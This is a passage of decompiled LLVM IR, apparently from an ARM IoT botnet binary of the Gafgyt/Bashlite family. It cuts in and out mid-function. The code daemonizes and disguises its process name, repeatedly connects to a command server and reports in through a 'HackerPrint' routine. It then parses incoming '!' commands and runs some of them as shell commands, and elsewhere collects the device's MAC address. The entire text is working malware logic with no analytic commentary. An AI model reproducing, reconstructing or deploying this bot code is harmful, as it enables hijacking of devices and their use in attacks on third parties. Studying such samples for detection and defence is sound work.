  %v3_1304c = call i32 @__GI_open(i32 ptrtoint ([16 x i8]* @global_var_245f0.1269 to i32), i32 0)
  %v2_130e4 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_130dc

dec_label_pc_1305c:                               ; preds = %dec_label_pc_130dc
  %v4_13070 = call i32 @strstr(i32 %v2_130e4, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_24600.1271, i32 0, i32 0))
  %v2_13078 = icmp eq i32 %v4_13070, 0
  br i1 %v2_13078, label %dec_label_pc_130c0, label %dec_label_pc_130a0.preheader

dec_label_pc_130a0.preheader:                     ; preds = %dec_label_pc_1305c
  %v2_130a49 = load i8, i8* %stack_var_-4168, align 1
  %v7_130a813 = icmp eq i8 %v2_130a49, 9
  br i1 %v7_130a813, label %dec_label_pc_130b0, label %dec_label_pc_13094

dec_label_pc_13094:                               ; preds = %dec_label_pc_130a0.preheader, %dec_label_pc_13094
  %v4_130a014 = phi i32 [ %v1_13098, %dec_label_pc_13094 ], [ %v2_130e4, %dec_label_pc_130a0.preheader ]
  %v1_13098 = add i32 %v4_130a014, 1
  %v5_1309c = inttoptr i32 %v1_13098 to i8*
  %v2_130a4 = load i8, i8* %v5_1309c, align 1
  %v7_130a8 = icmp eq i8 %v2_130a4, 9
  br i1 %v7_130a8, label %dec_label_pc_130b0, label %dec_label_pc_13094

dec_label_pc_130b0:                               ; preds = %dec_label_pc_13094, %dec_label_pc_130a0.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_130a0.preheader ], [ %v5_1309c, %dec_label_pc_13094 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_13104

dec_label_pc_130c0:                               ; preds = %dec_label_pc_1305c
  store i32 4096, i32* @r2, align 4
  %v3_130d8 = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_130dc

dec_label_pc_130dc:                               ; preds = %dec_label_pc_13038, %dec_label_pc_130c0
  %v4_130f4 = call i32 @fdgets(i32 %v2_130e4, i32 4096, i32 %v3_1304c, i32 %v2_130e4)
  %v2_130fc = icmp eq i32 %v4_130f4, 0
  br i1 %v2_130fc, label %dec_label_pc_13104, label %dec_label_pc_1305c

dec_label_pc_13104:                               ; preds = %dec_label_pc_130dc, %dec_label_pc_130b0
  %v1_13108 = call i32 @__GI_close(i32 %v3_1304c)
  %v4_13118 = load i8, i8* %stack_var_-4168, align 1
  %v2_1311c = icmp eq i8 %v4_13118, 0
  br i1 %v2_1311c, label %dec_label_pc_131b4, label %dec_label_pc_13124

dec_label_pc_13124:                               ; preds = %dec_label_pc_13104
  %v2_1312c = ptrtoint i32* %stack_var_-4200 to i32
  store i32 %v2_130e4, i32* @r1, align 4
  %v2_13144 = bitcast i32* %stack_var_-4200 to i8*
  %v3_13144 = call i32 @strcpy(i8* %v2_13144, i32 %v2_130e4)
  store i32 %v2_1312c, i32* @r3, align 4
  %v3_13164 = call i32 @ioctl(i32 %v3_12f5c, i32 35111, i32 %v2_1312c)
  %v2_13184 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_13174

dec_label_pc_13174:                               ; preds = %dec_label_pc_13124, %dec_label_pc_13174
  %storemerge47 = phi i32 [ 0, %dec_label_pc_13124 ], [ %v1_131a0, %dec_label_pc_13174 ]
  %v2_1318c = add i32 %storemerge47, %v2_13184
  %v1_13190 = inttoptr i32 %v2_1318c to i8*
  %v2_13190 = load i8, i8* %v1_13190, align 1
  %v4_13198 = add i32 %storemerge47, ptrtoint (i32* @global_var_2e4f0.1273 to i32)
  %v5_13198 = inttoptr i32 %v4_13198 to i8*
  store i8 %v2_13190, i8* %v5_13198, align 1
  %v1_131a0 = add nuw nsw i32 %storemerge47, 1
  %v7_131b0 = icmp slt i32 %v1_131a0, 6
  br i1 %v7_131b0, label %dec_label_pc_13174, label %dec_label_pc_131b4

dec_label_pc_131b4:                               ; preds = %dec_label_pc_13174, %dec_label_pc_13104
  %v1_131b8 = call i32 @__GI_close(i32 %v3_12f5c)
  %v3_131d4.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_131d0

dec_label_pc_131c0:                               ; preds = %dec_label_pc_13028, %dec_label_pc_12fe8, %dec_label_pc_12f74
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_131d0

dec_label_pc_131d0:                               ; preds = %dec_label_pc_131b4, %dec_label_pc_131c0
  %v3_131d4 = phi i32 [ %v3_131d4.pre, %dec_label_pc_131b4 ], [ 0, %dec_label_pc_131c0 ]
  %v2_131dc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_131dc, i32* @fp, align 4
  ret i32 %v3_131d4

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_13098, { 1, 0 }
  uselistorder i32 %v2_130e4, { 2, 1, 3, 5, 0, 4 }
  uselistorder i32 %v3_12f5c, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 4, 2, 0, 1, 3 }
  uselistorder i32 %tmp19, { 1, 0 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_htons, { 14, 13, 12, 11, 10, 9, 8, 2, 1, 0, 7, 6, 15, 5, 4, 3 }
  uselistorder i32 53, { 0, 2, 1 }
  uselistorder i32 (i32)* @inet_addr, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_131d0, { 1, 0 }
  uselistorder label %dec_label_pc_13174, { 1, 0 }
  uselistorder label %dec_label_pc_130dc, { 1, 0 }
  uselistorder label %dec_label_pc_13094, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  %v3_13210 = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_2460c.1275 to i32), i32 0)
  %v7_13218 = icmp eq i32 %v3_13210, -1
  %v4_13234 = select i1 %v7_13218, i32 ptrtoint ([7 x i8]* @global_var_24624.1279 to i32), i32 ptrtoint ([7 x i8]* @global_var_2461c.1277 to i32)
  ret i32 %v4_13234
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-1156 = alloca i32, align 4
  %stack_var_-5252 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13258 = load i32, i32* @r4, align 4
  store i32 %v3_13258, i32* %stack_var_-24, align 4
  store i32 78432, i32* %stack_var_-4, align 4
  %v19_13258 = ptrtoint i32* %stack_var_-24 to i32
  %v2_1325c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1325c, i32* @fp, align 4
  %v3_13298 = call i32 @access(i32 ptrtoint ([16 x i8]* @global_var_2460c.1275 to i32), i32 0)
  store i32 %v3_13298, i32* @r0, align 4
  %v7_132a0 = icmp eq i32 %v3_13298, -1
  %. = select i1 %v7_132a0, i32 ptrtoint ([19 x i8]* @global_var_24638.1286 to i32), i32 ptrtoint ([5 x i8]* @global_var_24630.1284 to i32)
  %v0_132bc = call i32 @geteuid()
  %v2_132c4 = icmp eq i32 %v0_132bc, 0
  br i1 %v2_132c4, label %dec_label_pc_132cc, label %dec_label_pc_132d8

dec_label_pc_132cc:                               ; preds = %entry
  store i32 0, i32* @global_var_2e1dc.1288, align 4
  br label %dec_label_pc_132d8

dec_label_pc_132d8:                               ; preds = %entry, %dec_label_pc_132cc
  %v0_132d8 = call i32 @getBuild()
  %v0_132e4 = call i32 @getBuild()
  store i32 %v0_132e4, i32* @r4, align 4
  %v2_132f0 = load i32, i32* @global_var_3473c.481, align 4
  store i32 %v2_132f0, i32* @r0, align 4
  %v1_132f4 = call i32 @__GI_inet_ntoa(i32 %v2_132f0)
  %v0_13300 = load i32, i32* @r4, align 4
  %v1_13300 = inttoptr i32 %v0_13300 to i8*
  %v1_13304 = inttoptr i32 %v1_132f4 to i8*
  %v9_13308 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_2464c.1291, i32 0, i32 0), i8* %v1_13300, i8* %v1_13304)
  %v1_1331c = bitcast i8** %argv to i32*
  %v2_1331c = load i32, i32* %v1_1331c, align 4
  store i32 %v2_1331c, i32* @r4, align 4
  %v2_13334 = load i32, i32* %v1_1331c, align 4
  %v1_13338 = inttoptr i32 %v2_13334 to i8*
  %v3_1333c = call i32 @strlen(i8* %v1_13338)
  %v0_13344 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2462c.1281 to i32), i32* @r1, align 4
  %v3_13350 = call i32 @strncpy(i32 %v0_13344, i32 ptrtoint (i32* @global_var_2462c.1281 to i32), i32 %v3_1333c)
  %v2_13364 = load i32, i32* %v1_1331c, align 4
  store i32 %v2_13364, i32* @r0, align 4
  %v2_13370 = call i32 @sprintf(i32 %v2_13364, i32 %.)
  %v6_13394 = call i32 @prctl(i32 15, i32 %., i32 0, i32 0, i32 0)
  %v2_1339c = call i32 @__GI_time(i32* null)
  store i32 %v2_1339c, i32* @r0, align 4
  store i32 %v2_1339c, i32* @r4, align 4
  %v0_133a4 = call i32 @__GI_getpid()
  %v0_133ac = load i32, i32* @r4, align 4
  %v2_133ac = xor i32 %v0_133ac, %v0_133a4
  %v1_133b4 = call i32 @srand(i32 %v2_133ac)
  %v2_133bc = call i32 @__GI_time(i32* null)
  store i32 %v2_133bc, i32* @r0, align 4
  store i32 %v2_133bc, i32* @r4, align 4
  %v0_133c4 = call i32 @__GI_getpid()
  %v0_133cc = load i32, i32* @r4, align 4
  %v2_133cc = xor i32 %v0_133cc, %v0_133c4
  %v1_133d4 = call i32 @init_rand(i32 %v2_133cc)
  %v1_133d8 = call i32 @getOurIP(i32 %v1_133d4)
  store i32 %v1_133d8, i32* @r0, align 4
  %v0_133dc = call i32 @__libc_fork()
  store i32 %v0_133dc, i32* @r0, align 4
  %v2_133ec = icmp eq i32 %v0_133dc, 0
  br i1 %v2_133ec, label %dec_label_pc_1341c, label %dec_label_pc_13410

dec_label_pc_13410:                               ; preds = %dec_label_pc_132d8
  %v2_133f4 = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v0_133dc, i32* @r0, align 4
  store i32 %v2_133f4, i32* @r1, align 4
  %v3_13404 = call i32 @__libc_waitpid(i32 %v0_133dc, i32 %v2_133f4, i32 0)
  %v1_1340c = call i32 @__GI_exit(i32 0)
  store i32 %v1_1340c, i32* @r0, align 4
  br label %dec_label_pc_1343c

dec_label_pc_1341c:                               ; preds = %dec_label_pc_132d8
  %v0_1341c = call i32 @__libc_fork()
  store i32 %v0_1341c, i32* @r0, align 4
  %v2_1342c = icmp eq i32 %v0_1341c, 0
  br i1 %v2_1342c, label %dec_label_pc_1343c, label %dec_label_pc_13434

dec_label_pc_13434:                               ; preds = %dec_label_pc_1341c
  %v1_13438 = call i32 @__GI_exit(i32 0)
  store i32 %v1_13438, i32* @r0, align 4
  br label %dec_label_pc_1343c

dec_label_pc_1343c:                               ; preds = %dec_label_pc_13410, %dec_label_pc_1341c, %dec_label_pc_13434
  %v0_1343c = call i32 @__GI_setsid()
  %v1_13444 = call i32 @chdir(i32 ptrtoint (i32* @global_var_2465c.1293 to i32))
  %v2_13450 = call i32 @bsd_signal(i32 13, i32 1)
  %v2_13c90 = ptrtoint i32* %stack_var_-5252 to i32
  %v4_13ca0 = bitcast i32* %stack_var_-5252 to i8*
  %v1_138cc = or i32 %v2_13c90, 1
  %v5_138d0 = inttoptr i32 %v1_138cc to i8*
  %v2_13a30 = ptrtoint i32* %stack_var_-1156 to i32
  %v2_13a40 = bitcast i32* %stack_var_-1156 to i8*
  %v2_13c1c = bitcast i8** %stack_var_-132 to i32*
  %v2_13c50 = add i32 %v19_13258, -108
  br label %dec_label_pc_13454

dec_label_pc_13454:                               ; preds = %dec_label_pc_13464, %dec_label_pc_13c80, %dec_label_pc_1343c
  %v0_13454 = call i32 @initConnection()
  %v2_1345c = icmp eq i32 %v0_13454, 0
  br i1 %v2_1345c, label %dec_label_pc_13470, label %dec_label_pc_13464

dec_label_pc_13464:                               ; preds = %dec_label_pc_13454
  %v1_13468 = call i32 @sleep(i32 5)
  br label %dec_label_pc_13454

dec_label_pc_13470:                               ; preds = %dec_label_pc_13454
  %v2_13474 = load i32, i32* @global_var_2e4e0.53, align 4
  store i32 %v2_13474, i32* @r4, align 4
  %v2_1347c = load i32, i32* @global_var_3473c.481, align 4
  store i32 %v2_1347c, i32* @r0, align 4
  %v1_13480 = call i32 @__GI_inet_ntoa(i32 %v2_1347c)
  store i32 %v1_13480, i32* @r5, align 4
  %v0_13488 = call i32 @getBuild()
  %v0_13498 = load i32, i32* @r4, align 4
  %v0_134a0 = load i32, i32* @r5, align 4
  store i32 %v0_134a0, i32* @r2, align 4
  %v2_134a8 = call i32 @HackerPrint(i32 %v0_13498, i32 ptrtoint (i32* @global_var_24660.1298 to i32))
  br label %dec_label_pc_13c80

dec_label_pc_134cc:                               ; preds = %dec_label_pc_13784, %dec_label_pc_13728
  %v3_134d0 = mul i32 %storemerge16, 4
  %v2_134dc = load i32, i32* @global_var_34748.62, align 4
  %v2_134e0 = add i32 %v2_134dc, %v3_134d0
  %v1_134e4 = inttoptr i32 %v2_134e0 to i32*
  %v2_134e4 = load i32, i32* %v1_134e4, align 4
  store i32 %v2_134e4, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v3_134f4 = call i32 @__libc_waitpid(i32 %v2_134e4, i32 0, i32 1)
  %tmp103 = icmp slt i32 %v3_134f4, 1
  br i1 %tmp103, label %dec_label_pc_1371c, label %dec_label_pc_13558

dec_label_pc_13514:                               ; preds = %dec_label_pc_13558, %dec_label_pc_135b0
  %v2_13518 = load i32, i32* @global_var_34748.62, align 4
  %v3_13524 = mul i32 %v1_13508, 4
  %v1_1351c = add i32 %v3_13524, -4
  %v2_13528 = add i32 %v1_1351c, %v2_13518
  %v2_13540 = add i32 %v2_13518, %v3_13524
  %v1_13544 = inttoptr i32 %v2_13540 to i32*
  %v2_13544 = load i32, i32* %v1_13544, align 4
  %v2_13548 = inttoptr i32 %v2_13528 to i32*
  store i32 %v2_13544, i32* %v2_13548, align 4
  br label %dec_label_pc_13558

dec_label_pc_13558:                               ; preds = %dec_label_pc_134cc, %dec_label_pc_13514
  %v3_13504.sink = phi i32 [ %v1_13508, %dec_label_pc_13514 ], [ %storemerge16, %dec_label_pc_134cc ]
  %v1_13508 = add i32 %v3_13504.sink, 1
  %v2_13570 = load i32, i32* @global_var_2e4e8.59, align 4
  %v9_13590 = icmp eq i32 %v2_13570, 0
  br i1 %v9_13590, label %dec_label_pc_135b0, label %dec_label_pc_13514

dec_label_pc_135b0:                               ; preds = %dec_label_pc_13558
  %v5_13570 = load i32, i32* @global_var_2e4ec.60, align 4
  %tmp104 = icmp ugt i32 %v5_13570, %v1_13508
  br i1 %tmp104, label %dec_label_pc_13514, label %dec_label_pc_135c8

dec_label_pc_135c8:                               ; preds = %dec_label_pc_135b0
  %v2_135cc = load i32, i32* @global_var_34748.62, align 4
  %v3_135d8 = mul i32 %v1_13508, 4
  %v1_135d0 = add i32 %v3_135d8, -4
  %v2_135dc = add i32 %v1_135d0, %v2_135cc
  %v2_135e4 = inttoptr i32 %v2_135dc to i32*
  store i32 0, i32* %v2_135e4, align 4
  %v2_135ec = load i32, i32* @global_var_2e4e8.59, align 4
  %v5_135ec = load i32, i32* @global_var_2e4ec.60, align 4
  %v2_135f8 = add i32 %v2_135ec, -1
  %v3_135f8 = icmp ne i32 %v2_135ec, 0
  %v3_135fc = add i32 %v5_135ec, -1
  %v4_135fc = zext i1 %v3_135f8 to i32
  %v5_135fc = add i32 %v3_135fc, %v4_135fc
  store i32 %v2_135f8, i32* @global_var_2e4e8.59, align 4
  store i32 %v5_135fc, i32* @global_var_2e4ec.60, align 4
  %v3_13618 = icmp eq i32 %v2_135ec, 0
  %v4_1361c = zext i1 %v3_13618 to i32
  %v5_1361c = add i32 %v5_135fc, %v4_1361c
  %v3_13620 = udiv i32 %v2_135ec, 1073741824
  %v3_13624 = mul i32 %v5_1361c, 4
  %v2_13628 = or i32 %v3_13624, %v3_13620
  store i32 %v2_13628, i32* @r4, align 4
  %v3_1362c = mul i32 %v2_135ec, 4
  %v1_13634 = call i32 @malloc(i32 %v3_1362c)
  br label %dec_label_pc_1368c

dec_label_pc_1364c:                               ; preds = %dec_label_pc_1368c, %dec_label_pc_136e8
  %v3_13650 = mul i32 %storemerge20, 4
  %v2_1365c = add i32 %v3_13650, %v1_13634
  %v2_13670 = load i32, i32* @global_var_34748.62, align 4
  %v2_13674 = add i32 %v2_13670, %v3_13650
  %v1_13678 = inttoptr i32 %v2_13674 to i32*
  %v2_13678 = load i32, i32* %v1_13678, align 4
  %v2_1367c = inttoptr i32 %v2_1365c to i32*
  store i32 %v2_13678, i32* %v2_1367c, align 4
  %v1_13684 = add i32 %storemerge20, 1
  br label %dec_label_pc_1368c

dec_label_pc_1368c:                               ; preds = %dec_label_pc_135c8, %dec_label_pc_1364c
  %storemerge20 = phi i32 [ 0, %dec_label_pc_135c8 ], [ %v1_13684, %dec_label_pc_1364c ]
  %v2_136a8 = load i32, i32* @global_var_2e4e8.59, align 4
  %v9_136c8 = icmp eq i32 %v2_136a8, 0
  br i1 %v9_136c8, label %dec_label_pc_136e8, label %dec_label_pc_1364c

dec_label_pc_136e8:                               ; preds = %dec_label_pc_1368c
  %v5_136a8 = load i32, i32* @global_var_2e4ec.60, align 4
  %tmp = icmp ugt i32 %v5_136a8, %storemerge20
  br i1 %tmp, label %dec_label_pc_1364c, label %dec_label_pc_13700

dec_label_pc_13700:                               ; preds = %dec_label_pc_136e8
  %v2_13704 = load i32, i32* @global_var_34748.62, align 4
  store i32 %v2_13704, i32* @r0, align 4
  %v0_1370c = call i32 @free()
  store i32 %v1_13634, i32* @global_var_34748.62, align 4
  br label %dec_label_pc_1371c

dec_label_pc_1371c:                               ; preds = %dec_label_pc_134cc, %dec_label_pc_13700
  %v1_13720 = add i32 %storemerge16, 1
  br label %dec_label_pc_13728

dec_label_pc_13728:                               ; preds = %dec_label_pc_13c80, %dec_label_pc_1371c
  %storemerge16 = phi i32 [ %v1_13720, %dec_label_pc_1371c ], [ 0, %dec_label_pc_13c80 ]
  %v3_13730 = ashr i32 %storemerge16, 31
  %v2_13744 = load i32, i32* @global_var_2e4e8.59, align 4
  %v5_13744 = load i32, i32* @global_var_2e4ec.60, align 4
  %v3_13764 = icmp uge i32 %v2_13744, %v3_13730
  %v9_13764 = icmp eq i32 %v2_13744, %v3_13730
  %v2_13768 = xor i1 %v9_13764, true
  %v3_13768 = and i1 %v3_13764, %v2_13768
  br i1 %v3_13768, label %dec_label_pc_134cc, label %dec_label_pc_1376c

dec_label_pc_1376c:                               ; preds = %dec_label_pc_13728
  br i1 %v9_13764, label %dec_label_pc_13784, label %dec_label_pc_1379c

dec_label_pc_13784:                               ; preds = %dec_label_pc_1376c
  %tmp118 = icmp ugt i32 %v5_13744, %storemerge16
  br i1 %tmp118, label %dec_label_pc_134cc, label %dec_label_pc_1379c

dec_label_pc_1379c:                               ; preds = %dec_label_pc_1376c, %dec_label_pc_13784
  %v2_137b0 = add i32 %v5_13ca0, %v2_13c90
  %v3_137b8 = inttoptr i32 %v2_137b0 to i8*
  store i8 0, i8* %v3_137b8, align 1
  %v2_137cc = call i32 @trim(i8* %v4_13ca0)
  %v4_137e4 = call i32 @strstr(i32 %v2_13c90, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ffd0.55, i32 0, i32 0))
  store i32 %v4_137e4, i32* @r2, align 4
  %v9_137f8 = icmp eq i32 %v4_137e4, %v2_13c90
  br i1 %v9_137f8, label %dec_label_pc_13800, label %dec_label_pc_13818

dec_label_pc_13800:                               ; preds = %dec_label_pc_1379c
  %v2_13804 = load i32, i32* @global_var_2e4e0.53, align 4
  %v3_13810 = call i32 @HackerPrint(i32 %v2_13804, i32 ptrtoint ([5 x i8]* @global_var_246e8.1303 to i32))
  br label %dec_label_pc_13c80

dec_label_pc_13818:                               ; preds = %dec_label_pc_1379c
  %v6_1382c = call i32 @strstr(i32 %v2_13c90, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_246f0.1305, i32 0, i32 0))
  %v9_13840 = icmp eq i32 %v6_1382c, %v2_13c90
  br i1 %v9_13840, label %dec_label_pc_13848, label %dec_label_pc_13850

dec_label_pc_13848:                               ; preds = %dec_label_pc_13818
  %v1_1384c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_13850

dec_label_pc_13850:                               ; preds = %dec_label_pc_13818, %dec_label_pc_13848
  %v2_13864 = load i8, i8* %v4_13ca0, align 4
  %v7_13868 = icmp eq i8 %v2_13864, 33
  br i1 %v7_13868, label %dec_label_pc_1388c, label %dec_label_pc_13c80

dec_label_pc_1388c:                               ; preds = %dec_label_pc_13850, %dec_label_pc_1389c
  %v3_13870.sink = phi i8* [ %storemerge10, %dec_label_pc_1389c ], [ %v4_13ca0, %dec_label_pc_13850 ]
  %v4_13870 = ptrtoint i8* %v3_13870.sink to i32
  %v1_13874 = add i32 %v4_13870, 1
  %storemerge10 = inttoptr i32 %v1_13874 to i8*
  %v2_13890 = load i8, i8* %storemerge10, align 1
  %v7_13894 = icmp eq i8 %v2_13890, 32
  br i1 %v7_13894, label %dec_label_pc_138ac, label %dec_label_pc_1389c

dec_label_pc_1389c:                               ; preds = %dec_label_pc_1388c
  %v2_138a0 = load i8, i8* %storemerge10, align 1
  %v2_138a4 = icmp eq i8 %v2_138a0, 0
  br i1 %v2_138a4, label %dec_label_pc_138ac, label %dec_label_pc_1388c

dec_label_pc_138ac:                               ; preds = %dec_label_pc_1389c, %dec_label_pc_1388c
  %v2_138b0 = load i8, i8* %storemerge10, align 1
  %v2_138b4 = icmp eq i8 %v2_138b0, 0
  br i1 %v2_138b4, label %dec_label_pc_13c80, label %dec_label_pc_138bc

dec_label_pc_138bc:                               ; preds = %dec_label_pc_138ac
  store i8 0, i8* %storemerge10, align 1
  %v3_138dc = call i32 @strlen(i8* %v5_138d0)
  %v2_138ec = add i32 %v3_138dc, %v2_13c90
  %v1_138f0 = add i32 %v2_138ec, 2
  %v5_138f4 = inttoptr i32 %v1_138f0 to i8*
  %v1_13924 = add i32 %v2_138ec, 1
  br label %dec_label_pc_13920

dec_label_pc_138fc:                               ; preds = %dec_label_pc_13948, %dec_label_pc_13920
  %v3_1390c = call i32 @strlen(i8* %v5_138f4)
  %v2_13914 = add i32 %v1_13924, %v3_1390c
  %v3_1391c = inttoptr i32 %v2_13914 to i8*
  store i8 0, i8* %v3_1391c, align 1
  br label %dec_label_pc_13920

dec_label_pc_13920:                               ; preds = %dec_label_pc_138bc, %dec_label_pc_138fc
  %v3_13930 = call i32 @strlen(i8* %v5_138f4)
  %v2_13938 = add i32 %v1_13924, %v3_13930
  %v1_1393c = inttoptr i32 %v2_13938 to i8*
  %v2_1393c = load i8, i8* %v1_1393c, align 1
  %v7_13940 = icmp eq i8 %v2_1393c, 10
  br i1 %v7_13940, label %dec_label_pc_138fc, label %dec_label_pc_13948

dec_label_pc_13948:                               ; preds = %dec_label_pc_13920
  store i32 %v1_13924, i32* @r4, align 4
  %v3_13958 = call i32 @strlen(i8* %v5_138f4)
  store i32 %v3_13958, i32* @r0, align 4
  %v0_13960 = load i32, i32* @r4, align 4
  %v2_13960 = add i32 %v0_13960, %v3_13958
  %v1_13964 = inttoptr i32 %v2_13960 to i8*
  %v2_13964 = load i8, i8* %v1_13964, align 1
  %v7_13968 = icmp eq i8 %v2_13964, 13
  br i1 %v7_13968, label %dec_label_pc_138fc, label %dec_label_pc_13970

dec_label_pc_13970:                               ; preds = %dec_label_pc_13948
  %v2_1398c22 = load i8, i8* %v5_138f4, align 1
  %v7_1399026 = icmp eq i8 %v2_1398c22, 32
  br i1 %v7_1399026, label %dec_label_pc_139a8, label %dec_label_pc_13998

dec_label_pc_1397c:                               ; preds = %dec_label_pc_13998
  %v1_13980 = add i32 %v4_1398828, 1
  %v5_13984 = inttoptr i32 %v1_13980 to i8*
  %v2_1398c = load i8, i8* %v5_13984, align 1
  %v7_13990 = icmp eq i8 %v2_1398c, 32
  br i1 %v7_13990, label %dec_label_pc_139a8, label %dec_label_pc_13998

dec_label_pc_13998:                               ; preds = %dec_label_pc_13970, %dec_label_pc_1397c
  %v4_1398828 = phi i32 [ %v1_13980, %dec_label_pc_1397c ], [ %v1_138f0, %dec_label_pc_13970 ]
  %stack_var_-64.027 = phi i8* [ %v5_13984, %dec_label_pc_1397c ], [ %v5_138f4, %dec_label_pc_13970 ]
  %v2_1399c = load i8, i8* %stack_var_-64.027, align 1
  %v2_139a0 = icmp eq i8 %v2_1399c, 0
  br i1 %v2_139a0, label %dec_label_pc_139a8, label %dec_label_pc_1397c

dec_label_pc_139a8:                               ; preds = %dec_label_pc_1397c, %dec_label_pc_13998, %dec_label_pc_13970
  %stack_var_-64.0.lcssa = phi i8* [ %v5_138f4, %dec_label_pc_13970 ], [ %v5_13984, %dec_label_pc_1397c ], [ %stack_var_-64.027, %dec_label_pc_13998 ]
  %v4_13988.lcssa = phi i32 [ %v1_138f0, %dec_label_pc_13970 ], [ %v1_13980, %dec_label_pc_1397c ], [ %v4_1398828, %dec_label_pc_13998 ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_139b8 = add i32 %v4_13988.lcssa, 1
  %v2_139fc33 = load i8, i8* %v5_138f4, align 1
  %v2_13a0035 = icmp eq i8 %v2_139fc33, 0
  br i1 %v2_13a0035, label %dec_label_pc_13a08, label %dec_label_pc_139cc

dec_label_pc_139cc:                               ; preds = %dec_label_pc_139a8, %dec_label_pc_139cc
  %v4_139f837 = phi i32 [ %v1_139f0, %dec_label_pc_139cc ], [ %v1_138f0, %dec_label_pc_139a8 ]
  %storemerge936 = phi i8* [ %v5_139f4, %dec_label_pc_139cc ], [ %v5_138f4, %dec_label_pc_139a8 ]
  %v2_139d0 = load i8, i8* %storemerge936, align 1
  %v3_139d0 = zext i8 %v2_139d0 to i32
  %v1_139d8 = call i32 @__GI_toupper(i32 %v3_139d0)
  store i32 %v1_139d8, i32* @r0, align 4
  %v1_139e8 = trunc i32 %v1_139d8 to i8
  store i8 %v1_139e8, i8* %storemerge936, align 1
  %v1_139f0 = add i32 %v4_139f837, 1
  %v5_139f4 = inttoptr i32 %v1_139f0 to i8*
  %v2_139fc = load i8, i8* %v5_139f4, align 1
  %v2_13a00 = icmp eq i8 %v2_139fc, 0
  br i1 %v2_13a00, label %dec_label_pc_13a08, label %dec_label_pc_139cc

dec_label_pc_13a08:                               ; preds = %dec_label_pc_139cc, %dec_label_pc_139a8
  %v2_13a0c = load i8, i8* %v5_138f4, align 1
  %v2_13a10 = icmp eq i8 %v2_13a0c, 0
  br i1 %v2_13a10, label %dec_label_pc_13a18, label %dec_label_pc_13afc

dec_label_pc_13a18:                               ; preds = %dec_label_pc_13a08
  %v0_13a18 = call i32 @listFork()
  %v2_13a20 = icmp eq i32 %v0_13a18, 0
  br i1 %v2_13a20, label %dec_label_pc_13a28, label %dec_label_pc_13c80

dec_label_pc_13a28:                               ; preds = %dec_label_pc_13a18
  store i32 1024, i32* @r2, align 4
  %v3_13a40 = call i32 @__GI_memset(i8* %v2_13a40, i32 0)
  %v6_13a60 = call i32 @szprintf(i32 %v2_13a30, i32 ptrtoint ([8 x i8]* @global_var_246f4.1307 to i32), i32 %v1_139b8, i32 %v2_13a30, i32 ptrtoint (i32* @0 to i32))
  %v3_13a7c = call i32 @fdpopen(i32 %v2_13a30, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_246fc.1309, i32 0, i32 0))
  br label %dec_label_pc_13ac4

dec_label_pc_13a8c:                               ; preds = %dec_label_pc_13ac4
  %v2_13a9c = call i32 @trim(i8* %v2_13a40)
  store i32 1024, i32* @r2, align 4
  %v3_13ab8 = call i32 @__GI_memset(i8* %v2_13a40, i32 0)
  %v1_13ac0 = call i32 @sleep(i32 1)
  br label %dec_label_pc_13ac4

dec_label_pc_13ac4:                               ; preds = %dec_label_pc_13a28, %dec_label_pc_13a8c
  %v4_13adc = call i32 @fdgets(i32 %v2_13a30, i32 1024, i32 %v3_13a7c, i32 %v2_13a30)
  %v2_13ae4 = icmp eq i32 %v4_13adc, 0
  br i1 %v2_13ae4, label %dec_label_pc_13aec, label %dec_label_pc_13a8c

dec_label_pc_13aec:                               ; preds = %dec_label_pc_13ac4
  %v1_13af0 = call i32 @fdpclose(i32 %v3_13a7c)
  %v1_13af8 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_13afc

dec_label_pc_13afc:                               ; preds = %dec_label_pc_13a08, %dec_label_pc_13aec
  %v2_13b10 = call i32 @__GI_strtok(i32 %v1_139b8, i32 ptrtoint (i32* @global_var_24700.1311 to i32))
  store i8* %v5_138f4, i8** %stack_var_-132, align 4
  %v2_13c0840 = icmp eq i32 %v2_13b10, 0
  br i1 %v2_13c0840, label %dec_label_pc_13c10, label %dec_label_pc_13b28

dec_label_pc_13b28:                               ; preds = %dec_label_pc_13afc, %dec_label_pc_13bf0
  %stack_var_-36.043.in = phi i32 [ %v2_13bf8, %dec_label_pc_13bf0 ], [ %v2_13b10, %dec_label_pc_13afc ]
  %stack_var_-40.141 = phi i32 [ %stack_var_-40.0, %dec_label_pc_13bf0 ], [ 1, %dec_label_pc_13afc ]
  %stack_var_-36.043 = inttoptr i32 %stack_var_-36.043.in to i8*
